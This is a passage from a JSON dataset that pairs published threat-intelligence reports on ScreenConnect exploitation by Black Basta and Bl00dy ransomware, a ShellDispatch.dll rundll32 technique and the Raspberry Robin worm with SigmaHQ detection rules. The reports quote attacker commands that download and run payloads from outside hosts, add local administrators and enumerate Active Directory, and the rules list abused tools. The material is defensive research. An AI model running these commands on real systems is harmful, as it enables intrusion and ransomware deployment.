        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_reg_rdp_keys_tamper.yml",
    "id": "425"
  },
  {
    "url": "https://www.trendmicro.com/en_us/research/24/b/threat-actor-groups-including-black-basta-are-exploiting-recent-.html",
    "markdown": "# Threat Actor Groups, Including Black Basta, are Exploiting Recent ScreenConnect Vulnerabilities\n\n**Exploits & Vulnerabilities**\n**February 27, 2024**\n\nThis blog entry gives a detailed analysis of these recent ScreenConnect vulnerabilities. We also discuss our discovery of threat actor groups, including Black Basta and Bl00dy Ransomware gangs, that are actively exploiting CVE-2024-1708 and CVE-2024-1709 based on our telemetry.\n\n---\n\n## A look at CVE-2024-1708 and CVE-2024-1709\n\nThe vulnerabilities have been assigned CVE identifiers, reflecting their severity and the necessity for prompt remediation:\n\n### 1. CVE-2024-1708: Path-Traversal Vulnerability\n\n**Description:**\nThis vulnerability affects ConnectWise ScreenConnect 23.9.7 and prior versions. It allows attackers unauthorized access to directories and files outside restricted areas, potentially leading to information disclosure and system compromise.\n\n**Base Score:** 8.4 HIGH\n\n### 2. CVE-2024-1709: Authentication Bypass Using an Alternate Path or Channel\n\n**Description:**\nConnectWise ScreenConnect 23.9.7 and earlier versions are affected by an authentication bypass vulnerability, enabling attackers to gain direct access to confidential information or critical systems.\n\n**Base Score:** 10.0 CRITICAL\n\n---\n\n## Vulnerability analysis\n\nThis section gives a brief technical explanation of the vulnerabilities and their root causes. When used in combination, an attacker can achieve full remote code execution on affected systems.\n\n### CVE-2024-1709: Authentication Bypass Using an Alternate Path or Channel\n\nThis vulnerability stems from a path issue in the `SetupModule` of `ScreenConnect.Web.dll`. Specifically, the way the `onPostMapRequestHandler` function’s implementation of the .NET `HttpRequest.Path` property is incorrect.\n\n```image\nAlt: Figure 1. The ScreenConnect.Web.dll.SetupModule onPostMapRequestHandler function\nDescription: The image displays a code snippet from the `OnPostMapRequestHandler` function in a .NET application, specifically within the `ScreenConnect.Web.dll.SetupModule`. The code highlights a boolean flag that checks if the context handler is an instance of `ISetupHandler` or compares the `context.Request.Path` to a specified text, using case-insensitive comparison. This snippet is relevant to the analysis of the CVE-2024-1709 vulnerability, illustrating the technical flaw that allows for an authentication bypass in the application.\nTranscription: |\n  // Token: 0x06000335 RID: 821 RVA: 0x000007878\n  private void OnPostMapRequestHandler(object sender, EventArgs e)\n  {\n      HttpContext context = ((HttpApplication)sender).Context;\n      bool flag = context.Handler is ISetupHandler || string.Equals(context.Request.Path, text, StringComparison.OrdinalIgnoreCase);\n  \n      if (!ConfigurationCache.IsSetup)\n      {\n          if (!ConfigurationCache.AllowRemoteSetup && !context.Request.IsLocal)\n          {\n              throw new HttpException(403, \"Application is in setup mode and is only accessible from local machine.\");\n          }\n          if (!flag && Regex.IsMatch(context.Request.Path, ConfigurationCache.SetupRedirectFilter))\n          {\n              context.Response.Redirect(text);\n              return;\n          }\n      }\n      else if (flag)\n      {\n          if (ConfigurationCache.AlreadySetupPage != null)\n          {\n              string url = context.Response.ApplyAppPathModifier(ConfigurationCache.AlreadySetupPage);\n              context.Response.Redirect(url);\n              return;\n          }\n          throw new HttpException(403, \"Application is already setup.\");\n      }\n  }\n```\n\n*Figure 1. The ScreenConnect.Web.dll.SetupModule onPostMapRequestHandler function*\n\nIn .NET, the path is a concatenation of `FilePath` and `PathInfo`. This means that an attacker can simply append a `PathInfo` trailer in the `SetupWizard.aspx` HTTP POST request to initiate the ScreenConnect SetupWizard and bypass authentication.\n\n```image\nAlt: Figure 2. SetupWizard.aspx FilePath and FileInfo trailer\nDescription: The image appears to be a screenshot of an HTTP request log displaying a GET request for the `SetupWizard.aspx` page. It highlights the `.NET PathInfo trailer` and `.NET FilePath`, indicating a vulnerability in the way the .NET framework processes these paths. The request details include the host IP address, user-agent information, and other relevant headers.\nTranscription: |\n  GET /SetupWizard.aspx/ HTTP/1.1\n  Host: 127.0.0.1:8888\n  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36\n  Edg/117.0.2045.47\n  \n  .NET PathInfo trailer\n  .NET FilePath\n```\n\n*Figure 2. SetupWizard.aspx FilePath and FileInfo trailer*\n\nCVE-2024-1709 is especially alarming in that it is incredibly trivial to exploit. When an attacker successfully adds unauthorized accounts into the Connectwise Server, those accounts can be abused to execute code.\n\n### CVE-2024-1708: Path-Traversal Vulnerability\n\nThis vulnerability stems from an issue in the `ScreenConnect.ZipFile.ExtractAllEntries` function in `ScreenConnect.Core.dll`. The root cause of this issue is the improper validation of user-supplied paths, which results in a directory traversal via ZipSlip attack.\n\n```image\nAlt: Figure 3. ScreenConnect.Core.dll ScreenConnect.ZipFile.ExtractAllEntries function\nDescription: The image shows a code snippet from a C# function named `ExtractAllEntries`. This function appears to be part of a vulnerability analysis related to the `ScreenConnect.ZipFile.ExtractAllEntries` function. The code details logic for handling zip file entries, including path validation using `Path.Combine`, and directory creation with `Directory.CreateDirectory`. It is relevant to the discussion of a path-traversal vulnerability (CVE-2024-1708), illustrating how improper user input validation can lead to security risks.\nTranscription: |\n  // Token: 0x06000595 RID: 1429 RVA: 0x0000EBC8 File Offset: 0x0000CDC8\n  public void ExtractAllEntries(string basePath)\n  {\n      foreach (ZipFile.ZipEntry zipEntry in this.entries)\n      {\n          string text = Path.Combine(basePath, zipEntry.Path);\n          FileSystemExtensions.DemandInParent(basePath, text);\n          if ((zipEntry.ExternalFileAttributes >> 16 & 16384U) != 0U || zipEntry.Path.EndsWith(\"\\\\\"))\n          {\n              Directory.CreateDirectory(text);\n          }\n          else\n          {\n              FileSystemExtensions.EnsureDirectoryExists(Path.GetDirectoryName(text));\n              using (FileStream fileStream = File.Create(text))\n              {\n                  zipEntry.Save(fileStream);\n              }\n          }\n      }\n  }\n```\n\n*Figure 3. ScreenConnect.Core.dll ScreenConnect.ZipFile.ExtractAllEntries function*\n\nIn a real-world attack chain, an attacker can leverage this vulnerability to upload malicious files such as web shells on infected machines.\n\n```image\nAlt: Figure 4. Exploitation of CVE-2024-1708 leads to ZipSlip attack\nDescription: The image shows a Wireshark packet capture that illustrates a POST request to the ScreenConnect Extension Service. The highlighted sections indicate a potential exploitation of the CVE-2024-1708 vulnerability, specifically pointing to a path traversal attack leading to a ZipSlip condition. The packet details include HTTP headers and a request containing a suspicious path ('../../rbqhziaa.ashxPK'), suggesting an attempt to upload a malicious file.\nTranscription: |\n  POST /Services/ExtensionService.ashx/InstallExtension HTTP/1.1\n  Host:\n  User-Agent:\n  Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 127.0.0.1; worker-src 'none'; block-all-mixed-content;\n  Content-Type: text/html; charset=utf-8\n  Content-Length: 12\n  ETag: \"W/\\\"C-kFT3RXPgGgWTRNBTvEJuZpTA\\\"\"\n  X-Powered-By: Express\n  \n  {\"UE5DB0AAAAANSWlthIyixvgAADEBAAAAAZgRmNGVjZGMmJmX0NMXW3Mw0tkwNGY3dktMDRlL0h1bmZ0bmlnPWpHcG9wPWh0cHM6Ly9jb20vZGV2ZWxvcGVyL2ZpbGUvY2FsbC9jb250ZXh0L2ZpbGUuYXNoeC9tYW5pZmVzdC54bWxl\"}\n  ...\n  e/../rbqhziia.ashxPK<-- CVE-2024-1708 leads to ZipSlip\n```\n\n*Figure 4. Exploitation of CVE-2024-1708 leads to ZipSlip attack*\n\n---\n\n## CVE-2024-1709 and CVE-2024-1708 attack chain\n\nFigure 5 is a visual representation of how threat actors can exploit these vulnerabilities.\n\n```image\nAlt: Figure 5. A simplified diagram showing how attackers exploit ScreenConnect vulnerabilities\nDescription: The image is a detailed diagram illustrating the attack chain for exploiting ScreenConnect vulnerabilities (CVE-2024-1709 and CVE-2024-1708). It is divided into three main sections: 'Initial Access', 'Execution', and 'Command and Control/Impact'. The 'Initial Access' section shows how an attacker exploits the SetupWizard.aspx to create an unauthorized account. The 'Execution' section depicts the use of a vulnerable ConnectWise Server to issue commands and deploy malicious payloads, while the 'Command and Control/Impact' section outlines the final stage where malicious commands and payloads are executed.\nTranscription: |\n  +-----------------------------+--------------------------+----------------------------+\n  | INITIAL ACCESS              | EXECUTION                | COMMAND AND CONTROL/IMPACT |\n  +-----------------------------+--------------------------+----------------------------+\n  |                             |                          |                            |\n  | Exploits SetupWizard.aspx   | Issues commands to       | Issues commands to         |\n  | to create unauthorized      |                          |                            |\n  | new account (CVE-2024-1709) | ScreenConnect Client App | Malicious Commands/        |\n  |                             |                          | Payloads                   |\n  |                             |                          |                            |\n  | Vulnerable On-Premise       |                          |                            |\n  | ConnectWise Server          |                          |                            |\n  | Use the connectwise         |                          |                            |\n  | server to deploy            |                          |                            |\n  | malicious commands          |                          |                            |\n  |                             |                          |                            |\n  | New account created         |                          |                            |\n  |                             |                          |                            |\n  | Utilizes CVE 2024-1708      |                          |                            |\n  | to upload malicious files   |                          |                            |\n  | such as webshells           |                          |                            |\n  +-----------------------------+--------------------------+----------------------------+\n```\n\n*Figure 5. A simplified diagram showing how attackers exploit ScreenConnect vulnerabilities*\n\n---\n\n## Various threat actor groups that are actively exploiting ScreenConnect vulnerabilities\n\nOur telemetry has found that diverse threat actor groups are exploiting vulnerabilities in ConnectWise ScreenConnect, with tactics ranging from ransomware deployment to information stealing and data exfiltration attacks.\n\n### Black Basta ransomware group\n\nOne of the groups who took advantage of these vulnerabilities is the notorious Black Basta. In some of the environments running vulnerable versions of ScreenConnect, we observed that Black Basta-affiliated Cobalt Strike beacons were deployed.\n\nUpon initial foothold on the vulnerable server, threat actors first performed reconnaissance, discovery, and privilege escalation activities by executing the following commands:\n\n- `net.exe group \"Domain Admins\" /domain`\n  *Used to list all members of the highly privileged \"Domain Admins\" group to identify potential high-value targets for further attacks.*\n\n- `nltest.exe /domain_trusts /all_trusts`\n  *Used to enumerate all domain trusts, which is critical for planning lateral movement or accessing resources across those domains.*\n\n- `net.exe localgroup Administrators Adminis /add`\n  *Used to add a new user or group to the local administrators group.*\n\nThe threat actors also deployed this script to count the number of computers in the Active Directory environment that have logged on within the past 90 days:\n\n```\npowershell.exe -c \"$D=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$L='LDAP://'.$D;$D = [ADSI]$L;$Date = $((Get-Date).AddDays(-90).ToFileTime());$str = '(&(objectcategory=computer)(|(lastlogon>='+$Date+')(lastlogontimestamp>='+$Date+')))';$s = [adsisearcher]$str;$s.searchRoot = $L.$D.distinguishedName;$s.PageSize = 10000;$s.PropertiesToLoad.Add('cn') > $Null;Foreach ($CA in $s.FindAll()){;$i++;}; Write-Output Total computers: $i\"\n```\n\nWe also observed that the following Black Basta-affiliated Cobalt Strike payloads have been deployed:\n\n| Command line                                                                                             | Payload SHA256 (Cobalt Strike)                                   | Cobalt Strike command and control (C&C)      |\n| -------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------- | -------------------------------------------- |\n| `powershell.exe iwr hxxp://207[.]246.74.189:804/download/Diablo.log -outfile C:\\Users\\Public\\Diablo.log` |                                                                  |                                              |\n| `rundll32.exe C:\\Users\\Public\\Diablo.log,ExtractFeatures`                                                | 11d2dde6c51e977ed6e3f3d3e256c78062ae41fe780aefecfba1627e66daf771 | HTTPS Beacon C&C: wipresolutions[.]com       |\n| `powershell.exe iwr hxxp://51[.]195.192.120:804/download/09D.log -outfile C:\\Users\\Public\\09D.log`       | cc13b5721f2ee6081c1244dd367a9de958353c29e32ea8b66e3b20b293fabc55 | DNS Beacon C&C: *.dns.artstrailreviews[.]com |\n| `powershell.exe iwr hxxp://198[.]244.169.213:8045/download/10443.exe -outfile C:\\Users\\Public\\10443.exe` | fa131238c3c35efe99cde59dd409c0436fd642b6bf5d56f994f52ab3a62bae4e | HTTPS Beacon C&C: wipresolutions[.]com       |\n\n---\n\n### Bl00dy Ransomware group\n\nThe Bl00dy Ransomware group is also capitalizing on these ScreenConnect vulnerabilities for ill gain. This ransomware group was initially identified in May 2022 and has previously used various zero-day vulnerabilities, including a PaperCut software vulnerability (CVE-2023-27350), for ransomware deployment purposes.\n\nWe’ve observed the following commands that the Bl00dy Ransomware group used to download and execute their ransomware payload:\n\n```\ncertutil.exe -urlcache -split -f http://23[.]26[.]137[.]225:8084/msappdata.msi c:\\mpyutd.msi\nC:\\Windows\\System32\\cmd.exe \"/c powershell -command \"\"curl hxxp://23[.]26[.]137[.]225:8084/msappdata.msi -o c:\\mpyuts.msi\"\"\"\n```\n\n**Ransomware payload:**\n8e51de4774d27ad31a83d5df060ba008148665ab9caf6bc889a5e3fba4d7e600\n\nThis ransomware payload drops a ransom note with the file name “Read_instructions_To_Decrypt.txt” and appends encrypted files with the .CRYPT extension.\n\n```image\nAlt: Figure 6. Ransom note dropped by Bl00dy ransomware actors\nDescription: The image depicts a ransom note dropped by the Bl00dy ransomware group. The note is presented in a Notepad window and contains a message addressed to the victim, outlining the ransom demand and instructions for payment. It states that all files on the victim's servers are encrypted and unusable, and emphasizes urgency by mentioning a time limit for payment. The note also includes contact information for the attackers and instructions to download an app for communication.\nTranscription: |\n  Hello\n  \n  We are a team of High-level competent team of Pentesters but NOT a THREAT to your reputable organization\n  \n  We secure networks of computers to avoid complete destruction and damages to companies\n  \n  We encrypted all files on Your servers to show signs of breach / network intrusion\n  \n  To resolve this Continue reading !!!!\n  \n  All files on Your Enterprise Network Servers and Connected Devices are Encrypted.\n  \n  Means, Files are modified and are not usable at the moment.\n  \n  Don't Panic !!!\n  \n  All Encrypted files can be reversed to original form and become usable...\n  \n  THIS is Only Possible if you buy the universal Decryption software from me.\n  \n  Price for universal Decryption Software is $ Contact us either through email or to chat app for the ransom price $\n  \n  You Have 72 Hours To Make Payment As Price of Universal Decryption software increases by $1000 dollars every 24 hours.\n  \n  Contact us on this email: 1b00dyadmi...\n  \n  Download tor app from\n  \n  Create new Account ...\n  \n  Send me friend request using my tor id:\n```\n\n*Figure 6. Ransom note dropped by Bl00dy ransomware actors*\n\n---\n\n## Conclusion\n\nFollowing our detailed examination of various threat actors exploiting vulnerabilities in ConnectWise ScreenConnect, we emphasize the urgency of updating to the latest version of the software. Immediate patching is not just advisable; it is a critical security requirement to protect your systems from these identified threats. Proactively managing updates is essential for maintaining robust cybersecurity defenses against these sophisticated attacks.\n\n---\n\n## MITRE ATT&CK techniques\n\n| Tactic              | Technique                         | ID        | Description                                                                                      |\n| ------------------- | --------------------------------- | --------- | ------------------------------------------------------------------------------------------------ |\n| Initial Access      | Exploit Public-Facing Application | T1190     | Threat actors exploited the ConnectWise Remote Management Vulnerabilities.                       |\n| Execution           | PowerShell                        | T1059.001 | Threat actors used PowerShell commands and scripts to execute malicious commands.                |\n| Discovery           | Account Discovery                 | T1087     | Threat actors used tools like `nltest.exe` and `net.exe` to discover the network infrastructure. |\n| Discovery           | Domain Trust Discovery            | T1482     | Threat actors gathered information on domain trust relationships.                                |\n| Command and Control | Ingress Tool Transfer             | T1105     | Threat actors used BITSAdmin and certutil to download additional malware.                        |\n| Command and Control | Remote Access Software            | T1219     | Adversaries abused remote management software like Connectwise, Atera, and Syncro.               |\n| Defense Evasion     | Impair Defenses                   | T1562     | Threat actors attempted to disable defense mechanisms like Windows Defender.                     |\n| Exfiltration        | Exfiltration Over C2 Channel      | T1041     | Adversaries may steal data by exfiltrating it over an existing C&C channel.                      |\n| Impact              | Data Encrypted for Impact         | T1486     | Threat actors attempted to encrypt data within victim environments by deploying ransomware.      |\n\n---\n\n## Trend Vision One queries\n\n| Description                                                          | Trend Vision One query                                                                                                     |\n| -------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------- |\n| Detect invocation of `nltest.exe` via ScreenConnect                  | `eventSubId:2 AND processCmd:ScreenConnect AND objectCmd:nltest`                                                           |\n| Detect interaction with Local Administrators group via ScreenConnect | `eventSubId:2 AND processCmd:ScreenConnect AND objectCmd:Administrators`                                                   |\n| Detect interaction with Domain Admins group via ScreenConnect        | `eventSubId:2 AND processCmd:ScreenConnect AND objectCmd:\"Domain Admins\"`                                                  |\n| Detect suspicious ScreenConnect invocation                           | `eventSubId:2 AND processCmd:ScreenConnect AND objectCmd:(\"powershell\" OR \"net\" OR \"nltest\" OR \"rundll32\" OR \"bitsadmin\")` |\n\n---\n\n## Indicators of compromise\n\nThe indicators of compromise for this entry can be found here.",
    "sigma_rule": {
      "title": "Remote Access Tool - ScreenConnect Potential Suspicious Remote Command Execution",
      "id": "7b582f1a-b318-4c6a-bf4e-66fe49bf55a5",
      "related": [
        {
          "id": "d1a401ab-8c47-4e86-a7d8-2460b6a53e4a",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects potentially suspicious child processes launched via the ScreenConnect client service.\n",
      "references": [
        "https://www.mandiant.com/resources/telegram-malware-iranian-espionage",
        "https://docs.connectwise.com/ConnectWise_Control_Documentation/Get_started/Host_client/View_menu/Backstage_mode",
        "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708",
        "https://www.trendmicro.com/en_us/research/24/b/threat-actor-groups-including-black-basta-are-exploiting-recent-.html"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems), @Kostastsale",
      "date": "2022-02-25",
      "modified": "2024-02-28",
      "tags": [
        "attack.command-and-control",
        "attack.t1219"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "ParentCommandLine|contains|all": [
            ":\\Windows\\TEMP\\ScreenConnect\\",
            "run.cmd"
          ],
          "Image|endswith": [
            "\\bitsadmin.exe",
            "\\cmd.exe",
            "\\curl.exe",
            "\\dllhost.exe",
            "\\net.exe",
            "\\nltest.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\rundll32.exe",
            "\\wevtutil.exe"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "If the script being executed make use of any of the utilities mentioned in the detection then they should filtered out or allowed."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_remote_access_tools_screenconnect_remote_execution_susp.yml",
    "id": "441"
  },
  {
    "url": "https://www.hexacorn.com/blog/2023/06/07/this-lolbin-doesnt-exist/",
    "markdown": "# This LOLBIN doesn’t exist…\n\nPosted on 2023-06-07\n\nI have written about Nullsoft installer a few times before. I am a bit fascinated by it, because there is not that much research about it, in general, and even less – about its esoteric, yet omnipresent DLL plug-ins…\n\nOne of the more interesting plug-ins that I know of, and yet, one that you will never really see residing on any system, is… *ShellDispatch.dll*.\n\nIt’s a rarely used Nullsoft Plug-In DLL that is known to be used by the installer of WinAmp, yes.. THE WinAmp… and even there… it is used temporarily, as it is immediately deleted from the file system after delivering the required functionality.\n\nWhat’s so special about it?\n\nThe *ShellDispatch.dll* exports a few functions:\n\n- AddRef\n- GetInterface\n- Release\n- RunDll_ShellExecuteW\n- ShellExecute\n\nThe *RunDll_ShellExecuteW* is the most interesting to us as it is a callback function specifically crafted to respond to invocations via *rundll32.exe*, and since it’s a wrapper for *ShellExecute* API we can use it to launch any program of our choice, f.ex, calculator:\n\n```\nrundll32 ShellDispatch.dll, RunDll_ShellExecute open calc\n```\n\n```image\nAlt: ShellDispatch\nDescription: The image depicts a command line interface (CLI) window showing an administrator command prompt on a Windows system. The prompt indicates that the current directory is 'C:\\test>', suggesting it's a command line session where commands can be executed. This type of interface is typically used for running scripts or executing commands in a Windows environment, relevant to the discussion of executing functions via the 'rundll32.exe' command as mentioned in the context.\nTranscription: |\n  Administrator: C:\\Windows\\System32\\cmd.exe\n  C:\\test>\n```\n\nAgain, the chances you will ever see it abused are VERY LOW.",
    "sigma_rule": {
      "title": "Potential ShellDispatch.DLL Functionality Abuse",
      "id": "82343930-652f-43f5-ab70-2ee9fdd6d5e9",
      "status": "test",
      "description": "Detects potential \"ShellDispatch.dll\" functionality abuse to execute arbitrary binaries via \"ShellExecute\"",
      "references": [
        "https://www.hexacorn.com/blog/2023/06/07/this-lolbin-doesnt-exist/"
      ],
      "author": "X__Junior (Nextron Systems)",
      "date": "2023-06-20",
      "tags": [
        "attack.execution",
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\rundll32.exe"
          },
          {
            "OriginalFileName": "RUNDLL32.EXE"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "RunDll_ShellExecuteW"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_rundll32_shelldispatch_potential_abuse.yml",
    "id": "459"
  },
  {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/",
    "markdown": "# Raspberry Robin worm part of larger ecosystem facilitating pre-ransomware activity\n\n**October 27, 2022**\n\n---\n\n> **April 2023 update** – Microsoft Threat Intelligence has shifted to a new threat actor naming taxonomy aligned around the theme of weather.\n>\n> - **DEV-0206** is now tracked as **Mustard Tempest**\n> - **DEV-0243** is now tracked as **Manatee Tempest**\n> - **DEV-0950** is now tracked as **Lace Tempest**\n> - **DEV-0651** is now tracked as **Storm-0651**\n> - **DEV-0856** is now tracked as **Storm-0856**\n>\n> To learn about how the new taxonomy represents the origin, unique traits, and impact of threat actors, and to get a complete mapping of threat actor names, read this blog: Microsoft shifts to a new threat actor naming taxonomy.\n\nMicrosoft has discovered recent activity indicating that the Raspberry Robin worm is part of a complex and interconnected malware ecosystem, with links to other malware families and alternate infection methods beyond its original USB drive spread. These infections lead to follow-on hands-on-keyboard attacks and human-operated ransomware activity. Our continuous tracking of Raspberry Robin-related activity also shows a very active operation: Microsoft Defender for Endpoint data indicates that nearly 3,000 devices in almost 1,000 organizations have seen at least one Raspberry Robin payload-related alert in the last 30 days.\n\nRaspberry Robin has evolved from being a widely distributed worm with no observed post-infection actions when Red Canary first reported it in May 2022, to one of the largest malware distribution platforms currently active. In July 2022, Microsoft security researchers observed devices infected with Raspberry Robin being installed with the FakeUpdates malware, which led to DEV-0243 activity. DEV-0243, a ransomware-associated activity group that overlaps with actions tracked as EvilCorp by other vendors, was first observed deploying the LockBit ransomware as a service (RaaS) payload in November 2021. Since then, Raspberry Robin has also started deploying IcedID, Bumblebee, and Truebot based on our investigations.\n\nIn October 2022, Microsoft observed Raspberry Robin being used in post-compromise activity attributed to another actor, DEV-0950 (which overlaps with groups tracked publicly as FIN11/TA505). From a Raspberry Robin infection, the DEV-0950 activity led to Cobalt Strike hands-on-keyboard compromises, sometimes with a Truebot infection observed in between the Raspberry Robin and Cobalt Strike stage. The activity culminated in deployments of the Clop ransomware. DEV-0950 traditionally uses phishing to acquire the majority of their victims, so this notable shift to using Raspberry Robin enables them to deliver payloads to existing infections and move their campaigns more quickly to ransomware stages.\n\nGiven the interconnected nature of the cybercriminal economy, it’s possible that the actors behind these Raspberry Robin-related malware campaigns—usually distributed through other means like malicious ads or email—are paying the Raspberry Robin operators for malware installs.\n\nRaspberry Robin attacks involve multi-stage intrusions, and its post-compromise activities require access to highly privileged credentials to cause widespread impact. Organizations can defend their networks from this threat by having security solutions like Microsoft Defender for Endpoint and Microsoft Defender Antivirus, which is built into Windows, to help detect Raspberry Robin and its follow-on activities, and by applying best practices related to credential hygiene, network segmentation, and attack surface reduction.\n\nIn this blog, we share our detailed analysis of these attacks and shed light on Raspberry Robin’s origins, since its earliest identified activity in September 2021, and motivations which have been debated since it was first reported in May 2022. We also provide mitigation guidance and other recommendations defenders can use to limit this malware’s spread and impact from follow-on hands-on-keyboard attacks.\n\n## A new worm hatches: Raspberry Robin’s initial propagation via USB drives\n\n> The Microsoft Detection and Response Team (DART) has been renamed to Microsoft Incident Response (Microsoft IR). For more information on IR services, go to Microsoft Incident Response.\n\nIn early May 2022, Red Canary reported that a new worm named Raspberry Robin was spreading to Windows systems through infected USB drives. The USB drive contains a Windows shortcut (LNK) file disguised as a folder. In earlier infections, this file used a generic file name like _recovery.lnk_, but in more recent ones, it uses brands of USB drives. It should be noted that USB-worming malware isn’t new, and many organizations no longer track these as a top threat.\n\nFor an attack relying on a USB drive to run malware upon insertion, the targeted system’s _autorun.inf_ must be edited or configured to specify which code to start when the drive is plugged in. Autorun of removable media is disabled on Windows by default. However, many organizations have widely enabled it through legacy Group Policy changes.\n\nThere has been much public debate about whether the Raspberry Robin drives use autoruns to launch or if it relies purely on social engineering to encourage users to click the LNK file. Microsoft Threat Intelligence Center (MSTIC) and Microsoft Detection and Response Team (DART) research has confirmed that both instances exist in observed attacks. Some Raspberry Robin drives only have the LNK and executable files, while drives from earlier infections have a configured _autorun.inf_. This change could be linked to why the names of the shortcut files changed from more generic names to brand names of USB drives, possibly encouraging a user to execute the LNK file.\n\nUpon insertion of the infected drive or launching of the LNK file, the UserAssist registry key in Windows—where Windows Explorer maintains a list of launched programs—is updated with a new value indicating a program was launched by Windows.\n\n```image\nAlt: This diagram shows the linear progression of earlier Raspberry Robin infections.\nDescription: The image is a flowchart illustrating the attack chain of the Raspberry Robin worm. It visually represents the sequence of actions that occur when the USB attachment is inserted. The steps include: 1. Inserting the USB attachment, 2. The LNK file creating a CMD.exe process, 3. The MSiexec.exe using the device's username and hostname to connect to command-and-control (C2) servers, and 4. Continued call outs to TOR nodes. Each step is depicted with icons and arrows indicating the progression of the attack.\nTranscription: |\n  [Diagram]\n  \n  USB attachment inserted\n      ↓\n  LNK file creates a CMD.exe process\n      ↓\n  MSIexec.exe using the device username and hostname connects to C2\n      ↓\n  Continued call outs to TOR nodes\n```\n\n_Figure 1. Attack chain of the original Raspberry Robin infections_\n\nThe UserAssist key stores the names of launched programs in ROT13-ciphered format, which means that every letter in the name of the program is replaced with the 13th letter in the alphabet after it. This routine makes the entries in this registry key not immediately readable. The UserAssist key is a useful forensic artifact to demonstrate which applications were launched on Windows, as outlined in Red Canary’s blog.\n\nWindows shortcut files are mostly used to create an easy-to-find shortcut to launch a program, such as pinning a link to a user’s browser on the taskbar. However, the format allows the launching of any code, and attackers often use LNK files to launch malicious scripts or run stored code remotely. Raspberry Robin’s LNK file points to _cmd.exe_ to launch the Windows Installer service _msiexec.exe_ and install a malicious payload hosted on compromised QNAP network attached storage (NAS) devices.\n\n```image\nAlt: Screenshot of command lines where Raspberry Robin uses the Windows installer service to connect to an external domain.\nDescription: The image displays a series of command line entries showing how the Raspberry Robin worm utilizes the Windows Installer service (msiexec) to connect to an external domain for downloading or executing malicious payloads. The commands include variations of the msiexec command, formatted with different case sensitivity, and reference an HTTP protocol connection to a domain along with a randomly generated path that likely incorporates the host name and username. This illustrates the mechanism by which the worm executes its payload upon infection.\nTranscription: |\n  MSiexEc /q-i \"http://[DOMAIN]:8080/[Randomly generated path]/[HOSTNAME]?[USERNAME]\"\n  MsiEXEC /q /i \"http://[DOMAIN]:8080/[Randomly generated path]/[HOSTNAME]?[USERNAME]\"\n  mSiexEc -Q\"Ihttp://[DOMAIN]:8080/[Randomly generated path]/[HOSTNAME]?[USERNAME]\"\n```\n\n_Figure 2. Examples of URLs connecting to an external domain_\n\nOnce the Raspberry Robin payload is running, it spawns additional processes by using system binaries such as _rundll32.exe_, _odbcconf.exe_, and _control.exe_ to use as living-off-the-land binaries (LOLBins) to run malicious code. Raspberry Robin also launches code via _fodhelper.exe_, a system binary for managing optional features, as a user access control (UAC) bypass.\n\nThe malware injects into system processes including _regsvr32.exe_, _rundll32.exe_, and _dllhost.exe_ and connects to various command-and-control (C2) servers hosted on Tor nodes.\n\nIn most instances, Raspberry Robin persists by adding itself to the RunOnce key of the registry hive associated with the user who executed the initial malware install. The registry key points to the Raspberry Robin binary, which has a random name and a random extension such as _.mh_ or _.vdm_ in the user’s _AppData_ folder or to _ProgramData_. The key uses the intended purpose of _regsvr32.exe_ to launch the portable executable (PE) file, allowing the randomized non-standard file extension to launch the executable content.\n\n```image\nAlt: Screenshot of the contents of the RunOnce registry key where the value points to the randomly-named Raspberry Robin file.\nDescription: The image displays a snippet of command lines used in the Raspberry Robin worm's operation. It shows the execution of 'rundll32.exe' with parameters that involve calling 'SHELL32.DLL' and 'REGSVR32.EXE' to run a malicious payload located in the user's temporary directory. This illustrates the malware's method of executing commands and its reliance on legitimate system binaries to carry out its malicious activities.\nTranscription: \"C:\\Windows\\System32\\rundll32.exe\" SHELL32.DLL,ShellExec_RunDLL REGSVR32.EXE /u -S \"C:\\Users[UserName]\\AppData\\Local\\Temp\\cnsbi.mh.\"\n```\n\n_Figure 3. Example of the contents of the RunOnce key_\n\nEntries in the RunOnce key delete the registry entry prior to launching the executable content at sign-in. Raspberry Robin re-adds this key once it is successfully running to ensure persistence. After the initial infection, this leads to _RunOnce.exe_ launching the malware payload in timelines. Raspberry Robin also temporarily renames the RunOnce key when writing to it to evade detections.\n\n## Raspberry Robin’s connection to a larger malware ecosystem\n\nSince our initial analysis, Microsoft security researchers have discovered links between Raspberry Robin and other malware families. The Raspberry Robin implant has also started to distribute other malware families, which is not uncommon in the cybercriminal economy, where attackers purchase “loads” or installs from operators of successful and widespread malware to facilitate their goals.\n\n```image\nAlt: This diagram shows Raspberry Robin worm's connections to various malware campaigns and threat operators. It also shows different infection methods seen in Raspberry Robin-related activity.\nDescription: The image is a detailed diagram illustrating the infection chain and connectivity of the Raspberry Robin worm to various malware campaigns and threat operators. It includes initial infection vectors such as malicious ads and attacker-controlled servers, leading to different malware types like ROSHTYAK and LockBit ransomware. The diagram outlines specific malware variants, their deployment dates, and interaction with human-operated ransomware intrusions, emphasizing the interconnected nature of cyber 